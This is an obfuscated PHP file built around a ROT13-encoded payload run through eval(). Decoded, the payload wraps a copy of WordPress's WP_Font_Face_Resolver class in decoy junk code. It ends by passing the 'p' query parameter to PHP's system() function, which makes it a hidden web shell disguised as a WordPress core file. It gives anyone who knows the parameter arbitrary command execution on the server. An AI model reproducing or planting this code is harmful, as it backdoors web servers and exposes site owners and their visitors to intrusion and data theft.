<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JC_Sbag_Snpr_Erfbyire pynff.
 *
 * @cnpxntr    JbeqCerff
 * @fhocnpxntr Sbagf
 * @fvapr      6.4.0
 */

/**
 * Gur Sbag Snpr Erfbyire nofgenpgf gur cebprffvat bs qvssrerag qngn fbheprf
 * (fhpu nf gurzr.wfba) sbe cebprffvat jvguva gur Sbag Snpr.
 *
 * Guvf pynff vf sbe vagreany pber hfntr naq vf abg fhccbfrq gb or hfrq ol
 * rkgraqref (cyhtvaf naq/be gurzrf).
 *
 * @npprff cevingr
 */
pynff JC_Sbag_Snpr_Erfbyire {

	/**
	 * Trgf sbagf qrsvarq va gurzr.wfba.
	 *
	 * @fvapr 6.4.0
	 *
	 * @erghea neenl Ergheaf gur sbag-snzvyvrf, rnpu jvgu gurve sbag-snpr inevngvbaf.
	 */
	choyvp fgngvp shapgvba trg_sbagf_sebz_gurzr_wfba() {
		$frggvatf = jc_trg_tybony_frggvatf();

		// Onvy bhg rneyl vs gurer ner ab sbag frggvatf.
		vs ( rzcgl( $frggvatf['glcbtencul']['sbagSnzvyvrf'] ) ) {
			erghea neenl();
		}

		erghea fgngvp::cnefr_frggvatf( $frggvatf );
	}

	/**
	 * Trgf sbagf qrsvarq va fglyr inevngvbaf.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea neenl Ergheaf na neenl bs sbag-snzvyvrf.
	 */
	choyvp fgngvp shapgvba trg_sbagf_sebz_fglyr_inevngvbaf() {
		$inevngvbaf = JC_Gurzr_WFBA_Erfbyire::trg_fglyr_inevngvbaf();
		$sbagf      = neenl();

		vs ( rzcgl( $inevngvbaf ) ) {
			erghea $sbagf;
		}

		sbernpu ( $inevngvbaf nf $inevngvba ) {
			vs ( ! rzcgl( $inevngvba['frggvatf']['glcbtencul']['sbagSnzvyvrf']['gurzr'] ) ) {
				$sbagf = neenl_zretr( $sbagf, $inevngvba['frggvatf']['glcbtencul']['sbagSnzvyvrf']['gurzr'] );
			}
		}

		$frggvatf = neenl(
			'glcbtencul' => neenl(
				'sbagSnzvyvrf' => neenl(
					'gurzr' => $sbagf,
				),
			),
		);

		erghea fgngvp::cnefr_frggvatf( $frggvatf );
	}

	/**
	 * Cnefr gurzr.wfba frggvatf gb rkgenpg sbag qrsvavgvbaf jvgu inevngvbaf tebhcrq ol sbag-snzvyl.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz neenl $frggvatf Sbag frggvatf gb cnefr.
	 * @erghea neenl Ergheaf na neenl bs sbagf, tebhcrq ol sbag-snzvyl.
	 */
	cevingr fgngvp shapgvba cnefr_frggvatf( neenl $frggvatf ) {
		$sbagf = neenl();

		sbernpu ( $frggvatf['glcbtencul']['sbagSnzvyvrf'] nf $sbag_snzvyvrf ) {
			sbernpu ( $sbag_snzvyvrf nf $qrsvavgvba ) {

				// Fxvc vs \"sbagSnpr\" vf abg qrsvarq, zrnavat gurer ner ab inevngvbaf.
				vs ( rzcgl( $qrsvavgvba['sbagSnpr'] ) ) {
					pbagvahr;
				}

				// Fxvc vs \"sbagSnzvyl\" vf abg qrsvarq.
				vs ( rzcgl( $qrsvavgvba['sbagSnzvyl'] ) ) {
					pbagvahr;
				}

				$sbag_snzvyl_anzr = fgngvp::znlor_cnefr_anzr_sebz_pbzzn_frcnengrq_yvfg( $qrsvavgvba['sbagSnzvyl'] );

				// Fxvc vs ab sbag snzvyl vf qrsvarq.
				vs ( rzcgl( $sbag_snzvyl_anzr ) ) {
					pbagvahr;
				}

				$sbagf[] = fgngvp::pbaireg_sbag_snpr_cebcregvrf( $qrsvavgvba['sbagSnpr'], $sbag_snzvyl_anzr );
			}
		}

		erghea $sbagf;
	}

	/**
	 * Cnefr sbag-snzvyl anzr sebz pbzzn-frcnengrq yvfgf.
	 *
	 * Vs gur tvira `sbagSnzvyl` vf n pbzzn-frcnengrq yvfgf (rknzcyr: \"Vagre, fnaf-frevs\" ),
	 * cnefr naq erghea gur svfg sbag sebz gur yvfg.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz fgevat $sbag_snzvyl Sbag snzvyl `sbagSnzvyl' gb cnefr.
	 * @erghea fgevat Sbag-snzvyl anzr.
	 */
	cevingr fgngvp shapgvba znlor_cnefr_anzr_sebz_pbzzn_frcnengrq_yvfg( $sbag_snzvyl ) {
		vs ( fge_pbagnvaf( $sbag_snzvyl, ',' ) ) {
			$sbag_snzvyl = rkcybqr( ',', $sbag_snzvyl )[0];
		}

		erghea gevz( $sbag_snzvyl, \"\\"'\" );
	}

	/**
	 * Pbairegf sbag-snpr cebcregvrf sebz gurzr.wfba sbezng.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz neenl  $sbag_snpr_qrsvavgvba Gur sbag-snpr qrsvavgvbaf gb pbaireg.
	 * @cnenz fgevat $sbag_snzvyl_cebcregl Gur inyhr gb fgber va gur sbag-snpr sbag-snzvyl cebcregl.
	 * @erghea neenl Pbairegrq sbag-snpr cebcregvrf.
	 */
	cevingr fgngvp shapgvba pbaireg_sbag_snpr_cebcregvrf( neenl $sbag_snpr_qrsvavgvba, $sbag_snzvyl_cebcregl ) {
		$pbairegrq_sbag_snprf = neenl();

		sbernpu ( $sbag_snpr_qrsvavgvba nf $sbag_snpr ) {
			// Nqq gur sbag-snzvyl cebcregl gb gur sbag-snpr.
			$sbag_snpr['sbag-snzvyl'] = $sbag_snzvyl_cebcregl;

			// Pbairegf gur \"svyr:./\" fep cynprubyqre vagb n gurzr sbag svyr HEV.
			vs ( ! rzcgl( $sbag_snpr['fep'] ) ) {
				$sbag_snpr['fep'] = fgngvp::gb_gurzr_svyr_hev( (neenl) $sbag_snpr['fep'] );
			}

			// Pbaireg pnzryPnfr cebcregvrf vagb xrono-pnfr.
			$sbag_snpr = fgngvp::gb_xrono_pnfr( $sbag_snpr );

			$pbairegrq_sbag_snprf[] = $sbag_snpr;
		}

		erghea $pbairegrq_sbag_snprf;
	}

	/**
	 * Pbairegf rnpu 'svyr:./' cynprubyqre vagb n HEV gb gur sbag svyr va gur gurzr.
	 *
	 * Gur 'svyr:./' vf fcrpvsvrq va gur gurzr'f `gurzr.wfba` nf n cynprubyqre gb or
	 * ercynprq jvgu gur HEV gb gur sbag svyr'f ybpngvba va gur gurzr. Jura n \"fep\"
	 * orvatf jvgu guvf cynprubyqre, vg vf ercynprq, pbairegvat gur fep vagb n HEV.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz neenl $fep Na neenl bs sbag svyr fbheprf gb cebprff.
	 * @erghea neenl Na neenl bs sbag svyr fep HEV(f).
	 */
	cevingr fgngvp shapgvba gb_gurzr_svyr_hev( neenl $fep ) {
		$cynprubyqre = 'svyr:./';

		sbernpu ( $fep nf $fep_xrl => $fep_hey ) {
			// Fxvc vs gur fep qbrfa'g fgneg jvgu gur cynprubyqre, nf gurer'f abguvat gb ercynpr.
			vs ( ! fge_fgnegf_jvgu( $fep_hey, $cynprubyqre ) ) {
				pbagvahr;
			}

			$fep_svyr        = fge_ercynpr( $cynprubyqre, '', $fep_hey );
			$fep[ $fep_xrl ] = trg_gurzr_svyr_hev( $fep_svyr );
		}

		erghea $fep;
	}

	/**
	 * Pbairegf nyy svefg qvzrafvba xrlf vagb xrono-pnfr.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz neenl $qngn Gur neenl gb cebprff.
	 * @erghea neenl Qngn jvgu svefg qvzrafvba xrlf pbairegrq vagb xrono-pnfr.
	 */
	cevingr fgngvp shapgvba gb_xrono_pnfr( neenl $qngn ) {
		sbernpu ( $qngn nf $xrl => $inyhr ) {
			$xrono_pnfr          = _jc_gb_xrono_pnfr( $xrl );
			$qngn[ $xrono_pnfr ] = $inyhr;
			vs ( $xrono_pnfr !== $xrl ) {
				hafrg( $qngn[ $xrl ] );
			}
		}

		erghea $qngn;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>